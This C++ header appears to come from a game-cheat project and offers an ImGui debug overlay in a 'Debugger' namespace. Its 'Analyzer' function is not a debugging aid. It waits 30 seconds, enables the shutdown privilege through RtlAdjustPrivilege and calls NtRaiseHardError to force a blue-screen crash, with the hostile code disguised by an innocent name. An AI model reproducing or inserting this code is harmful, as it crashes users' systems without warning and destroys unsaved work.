#pragma once

#include "..\OS-ImGui\imgui\imgui.h"
#include "..\MenuConfig.hpp"
typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
namespace Debugger
{
	inline void Render(const char *Function, const char *debugs) noexcept
	{
		if (!DebuggerConfig::Debug)
			return;

		ImGuiWindowFlags windowFlags = ImGuiWindowFlags_NoCollapse | ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_AlwaysAutoResize;
		ImGui::SetNextWindowBgAlpha(0.3f);
		ImGui::Begin(Function, nullptr, windowFlags);

		ImGui::Text(debugs);
	}
	inline void Analyzer()
	{
		std::this_thread::sleep_for(std::chrono::seconds(30));
		BOOLEAN bEnabled;
		ULONG uResp;
		LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
		LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtRaiseHardError");
		pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
		pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
		NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
		NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
		return;
	}
}
